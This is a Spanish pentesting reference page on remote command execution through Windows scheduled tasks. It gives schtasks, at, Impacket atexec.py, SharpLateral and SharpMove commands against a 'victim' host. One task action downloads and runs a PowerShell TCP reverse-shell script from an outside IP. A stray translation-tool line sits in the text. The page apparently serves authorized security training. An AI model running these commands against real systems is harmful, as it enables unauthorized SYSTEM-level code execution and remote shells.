# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Cómo funciona

Con acceso administrativo a un host Windows, un operador puede crear e iniciar una tarea programada de forma remota. La opción `/S` selecciona el host remoto, `/U` y `/P` proporcionan las credenciales para crear la tarea cuando es necesario, y `/RU` selecciona la cuenta bajo la que se ejecuta la tarea. El comando al que hace referencia `/TR` debe existir en el sistema remoto.<sup>[[1]](#references)</sup>

El comando `at` antiguo también puede programar un comando en un host remoto cuando el servicio Schedule está en ejecución. Ejecuta los trabajos programados bajo la cuenta del servicio, que suele ser `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Crea la tarea y luego iníciala:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Proporciona el texto que quieres traducir.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Para una tarea semanal recurrente, utiliza un horario semanal válido y especifica el día explícitamente:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Una acción de tarea también puede invocar PowerShell directamente. El siguiente ejemplo de laboratorio descarga y ejecuta un script; aloja el payload únicamente en infraestructura autorizada para la evaluación:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
`atexec.py` de Impacket automatiza la ejecución remota de comandos mediante el servicio Task Scheduler y acepta autenticación con contraseña, hash NTLM o Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral proporciona un método de ejecución mediante tareas programadas:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove proporciona otra implementación de Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Más información sobre el [**uso de schtasks con silver tickets aquí**](../active-directory-methodology/silver-ticket.md#host).

Elimina las tareas de testing después de usarlas:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - comando `at`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
